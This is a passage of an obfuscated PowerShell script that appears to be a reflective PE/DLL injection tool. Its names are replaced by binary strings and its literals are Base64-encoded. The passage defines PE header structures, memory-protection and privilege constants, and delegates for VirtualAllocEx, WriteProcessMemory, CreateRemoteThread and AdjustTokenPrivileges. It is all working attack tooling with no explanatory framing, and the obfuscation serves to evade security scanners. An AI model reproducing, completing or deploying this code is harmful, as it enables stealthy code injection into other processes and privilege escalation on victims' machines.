		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${10100000001011101} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${10100000001011101}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${10011010100101001}, [System.ValueType], 8)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00000001011111000} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${00000001011111000}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${10011010100101001}, [System.ValueType], 20)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00101100000000111} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${00101100000000111}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${10011010100101001}, [System.ValueType], 40)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01010101111000111} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${01010101111000111}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${10011010100101001}, [System.ValueType], 8)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00111011101000010} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${00111011101000010}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${10011010100101001}, [System.ValueType], 12)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${00111011101000010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01010100001011110} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${01010100001011110}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${10011010100101001}, [System.ValueType], 16)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${01010100001011110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01010010010110001} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${01010010010110001}
		return $Win32Types
	}
	Function _00000010000011111
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function _00010101001110011
	{
		$Win32Functions = New-Object System.Object
		${10000110111011111} = _01010110001101110 kernel32.dll VirtualAlloc
		${00001101000000000} = _10000101101101101 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${10001101100110110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10000110111011111}, ${00001101000000000})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${10001101100110110}
		${01101001001110100} = _01010110001101110 kernel32.dll VirtualAllocEx
		${00101001010000110} = _10000101101101101 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${00101010001100001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01101001001110100}, ${00101001010000110})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${00101010001100001}
		${00011110100101001} = _01010110001101110 msvcrt.dll memcpy
		${01100101111010011} = _10000101101101101 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${10001110001101100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00011110100101001}, ${01100101111010011})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${10001110001101100}
		${01100000111000000} = _01010110001101110 msvcrt.dll memset
		${00000111011110101} = _10000101101101101 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${10110000101000100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01100000111000000}, ${00000111011110101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${10110000101000100}
		${00110111001010110} = _01010110001101110 kernel32.dll LoadLibraryA
		${10001011001110010} = _10000101101101101 @([String]) ([IntPtr])
		${10101100110001100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110111001010110}, ${10001011001110010})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${10101100110001100}
		${10001000011111100} = _01010110001101110 kernel32.dll GetProcAddress
		${00110001100001110} = _10000101101101101 @([IntPtr], [String]) ([IntPtr])
		${01101001111001111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10001000011111100}, ${00110001100001110})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${01101001111001111}
		${01110001011001110} = _01010110001101110 kernel32.dll GetProcAddress 
		${10100000000111101} = _10000101101101101 @([IntPtr], [IntPtr]) ([IntPtr])
		${01011100001011101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01110001011001110}, ${10100000000111101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${01011100001011101}
		${00101111100100100} = _01010110001101110 kernel32.dll VirtualFree
		${01010110000101001} = _10000101101101101 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${00000001001011011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101111100100100}, ${01010110000101001})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${00000001001011011}
		${01001101111111111} = _01010110001101110 kernel32.dll VirtualFreeEx
		${00101011110100101} = _10000101101101101 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${10111101011010010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001101111111111}, ${00101011110100101})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${10111101011010010}
		${10001010010110111} = _01010110001101110 kernel32.dll VirtualProtect
		${10011111010001111} = _10000101101101101 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${01001100000001110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10001010010110111}, ${10011111010001111})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${01001100000001110}
		${00000111110001000} = _01010110001101110 kernel32.dll GetModuleHandleA
		${00011101111011101} = _10000101101101101 @([String]) ([IntPtr])
		${00010101110110111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000111110001000}, ${00011101111011101})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${00010101110110111}
		${10101100011010100} = _01010110001101110 kernel32.dll FreeLibrary
		${10001101001010111} = _10000101101101101 @([IntPtr]) ([Bool])
		${01011110010001110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101100011010100}, ${10001101001010111})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${01011110010001110}
		${00110100001100110} = _01010110001101110 kernel32.dll OpenProcess
	    ${10001011101100111} = _10000101101101101 @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${01000101001011100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110100001100110}, ${10001011101100111})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${01000101001011100}
		${00110111001000011} = _01010110001101110 kernel32.dll WaitForSingleObject
	    ${00100111001000000} = _10000101101101101 @([IntPtr], [UInt32]) ([UInt32])
	    ${01001000010110111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110111001000011}, ${00100111001000000})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${01001000010110111}
		${00100001000010011} = _01010110001101110 kernel32.dll WriteProcessMemory
        ${01001101011011101} = _10000101101101101 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${10011111111111101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00100001000010011}, ${01001101011011101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${10011111111111101}
		${10011011111011111} = _01010110001101110 kernel32.dll ReadProcessMemory
        ${10001011111000101} = _10000101101101101 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${01101111000010001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10011011111011111}, ${10001011111000101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${01101111000010001}
		${01011000111001000} = _01010110001101110 kernel32.dll CreateRemoteThread
        ${00000010011000101} = _10000101101101101 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${10011110000110111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01011000111001000}, ${00000010011000101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${10011110000110111}
		${00011010001001111} = _01010110001101110 kernel32.dll GetExitCodeThread
        ${00001000000000011} = _10000101101101101 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${00011011000011100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00011010001001111}, ${00001000000000011})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${00011011000011100}
		${00101110100101000} = _01010110001101110 Advapi32.dll OpenThreadToken
        ${01000011011000101} = _10000101101101101 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${00110010101101001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101110100101000}, ${01000011011000101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${00110010101101001}
		${01000110110011100} = _01010110001101110 kernel32.dll GetCurrentThread
        ${10011110010001110} = _10000101101101101 @() ([IntPtr])
        ${10100101000010011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01000110110011100}, ${10011110010001110})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${10100101000010011}
		${10101001101011110} = _01010110001101110 Advapi32.dll AdjustTokenPrivileges
        ${00101000101101001} = _10000101101101101 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${00100101001110000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101001101011110}, ${00101000101101001})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${00100101001110000}
		${01100000000010001} = _01010110001101110 Advapi32.dll LookupPrivilegeValueA
        ${00110011001010011} = _10000101101101101 @([String], [String], [IntPtr]) ([Bool])
        ${01111010001101000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01100000000010001}, ${00110011001010011})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${01111010001101000}
		${00010100000001100} = _01010110001101110 Advapi32.dll ImpersonateSelf
        ${00101101101001110} = _10000101101101101 @([Int32]) ([Bool])
        ${00100110000001011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00010100000001100}, ${00101101101001110})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${00100110000001011}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${00101101001011100} = _01010110001101110 NtDll.dll NtCreateThreadEx
            ${10111100110111011} = _10000101101101101 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${10101100100110111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101101001011100}, ${10111100110111011})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${10101100100110111}
        }
		${01100111111101101} = _01010110001101110 Kernel32.dll IsWow64Process
        ${00101001101001101} = _10000101101101101 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${01000110101000011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01100111111101101}, ${00101001101001101})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${01000110101000011}
		${01101110011011011} = _01010110001101110 Kernel32.dll CreateThread
        ${10110100010111000} = _10000101101101101 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${10110100110000000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01101110011011011}, ${10110100010111000})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${10110100110000000}
		return $Win32Functions
	}
	Function _01001111001101000
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${_01011000010111101},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_10100011100111111}
		)
		[Byte[]]${01010101001100110} = [BitConverter]::GetBytes(${_01011000010111101})
		[Byte[]]${00100101000101101} = [BitConverter]::GetBytes(${_10100011100111111})
		[Byte[]]${00101110111101011} = [BitConverter]::GetBytes([UInt64]0)
		if (${01010101001100110}.Count -eq ${00100101000101101}.Count)
		{
			${10101011011111000} = 0
			for (${00011111101110101} = 0; ${00011111101110101} -lt ${01010101001100110}.Count; ${00011111101110101}++)
			{
				${00110000111100110} = ${01010101001100110}[${00011111101110101}] - ${10101011011111000}
				if (${00110000111100110} -lt ${00100101000101101}[${00011111101110101}])
				{
					${00110000111100110} += 256
					${10101011011111000} = 1
				}
				else
				{
					${10101011011111000} = 0
				}
				[UInt16]${10111100110000100} = ${00110000111100110} - ${00100101000101101}[${00011111101110101}]
				${00101110111101011}[${00011111101110101}] = ${10111100110000100} -band 0x00FF
			}
		}
		else
		{
